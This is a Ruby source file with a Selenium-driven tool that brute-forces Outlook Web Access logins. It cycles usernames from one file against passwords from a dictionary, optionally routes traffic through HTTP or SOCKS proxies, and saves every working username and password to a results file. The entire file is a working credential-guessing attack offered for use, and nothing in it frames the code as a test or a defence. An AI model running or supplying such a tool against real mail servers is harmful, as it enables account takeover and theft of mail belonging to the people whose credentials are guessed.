begin
	require "selenium-webdriver"
rescue 
	puts "Selenium webdriver is not installed please install it: \"gem intall selenium-webdriver\""
end


class Outlook
	def initialize(host,path,file,password,result_file,proxy,http_proxy)
		begin
			
			@base_url = host 
			@path = path
			
			if proxy == ""
				profile = Selenium::WebDriver::Firefox::Profile.new
				if http_proxy == ""
				  # No proxy
				  @driver = Selenium::WebDriver.for :firefox
				else
  				# Firefox profile configure HTTP(S) proxy
  				
  				proxy_info = http_proxy.split(":")
  				profile['network.proxy.http'] = proxy_info[0].to_s
  				profile['network.proxy.http_port'] = proxy_info[1].to_i
  				profile['network.proxy.ssl'] = proxy_info[0].to_s
  				profile['network.proxy.ssl_port'] = proxy_info[1].to_i
  				profile['network.proxy.type'] = 1
  				@driver = Selenium::WebDriver.for :firefox, :profile => profile
  			end
			else
				# Firefox profile configure socks proxy
				profile = Selenium::WebDriver::Firefox::Profile.new
				
				proxy_info = proxy.split(":")
				profile['network.proxy.socks'] = proxy_info[0].to_s
				profile['network.proxy.socks_port'] = proxy_info[1].to_i
				profile['network.proxy.type'] = 1

				@driver = Selenium::WebDriver.for :firefox, :profile => profile
			end
			
			@accept_next_alert = true
			@driver.manage.timeouts.implicit_wait = 30
			@verification_errors = []
			
			
			# Provide a file with a list of users 
			@file= file
			
			# Password file to use
			@password = password
			
			# Provide a result file where valid users and passwords will be stored
			@result_file = result_file
		rescue 
			puts "exception"
		end
	end
	
	def brute_user_password
		f = nil
		
		
		p = ""
		if File.exists?(@password.to_s)
			p = File.new(@password,'r+')
		else
			p = File.new('dictionaries/passwd1','r+')
		end
		@driver.get(@base_url + @path)
		begin
		    p.each do |passwd|
    	  f = File.new(@file,'r+')
    		f.each do |user|

    				result = File.new(@result_file,'a+')
						user = user.to_s.strip
  					passwd = passwd.to_s.strip
    				#user = "domain" + "\\" + user.to_s
				user = user.to_s
    				puts "Testing User:#{user} Password:#{passwd}"
				
    				@driver.find_element(:id, "username").clear
    				@driver.find_element(:id, "username").send_keys user.to_s
    				@driver.find_element(:id, "password").clear
    				@driver.find_element(:id, "password").send_keys passwd.to_s
    				@driver.find_element(:css, "input.btn").click
    				@driver.find_element(:css, "span.signinTxt").click
    				if element_present?(:id, "password")
    					#Wrong password
    					@driver.manage.delete_all_cookies
    				else
    					puts "Yeah!!!!!!!!!!!!!! Correct password!   User:#{user} Password:#{passwd}"
    					@driver.find_element(:id, "lo").click
    					result.puts "User:#{user} Password:#{passwd}"	
    					@driver.manage.delete_all_cookies
    				end
    			@driver.manage.delete_all_cookies
    			result.close
    		end
    		f.close
    	end
		p.close
		rescue Exception => e  
			result.puts "Exception with User:#{user} Password:#{passwd}"	
			result.puts e.message  							
			puts e.message  							
			#@driver.find_element(:name, "pthdr2logout").click
		end
		
		@driver.quit
	end
	
	def get_domain
		domain = @base_url.match(/\w+.\w+\//).slice("/")
		puts domain
		return domain
	end
	
	def read_file
		f = File.new(@file,'r+')
		f.each do |line|
			puts line
		end
		f.close
	end
	
	def element_present?(how, what)
		@driver.find_element(how, what)
		true
	rescue Selenium::WebDriver::Error::NoSuchElementError
		false
	end
  
	def verify(&blk)
		yield
	rescue ExpectationNotMetError => ex
		@verification_errors << ex
	end
  
	def close_alert_and_get_its_text(how, what)
		alert = @driver.switch_to().alert()
		if (@accept_next_alert) then
			alert.accept()
		else
			alert.dismiss()
		end
			alert.text
		ensure
			@accept_next_alert = true
	end
end

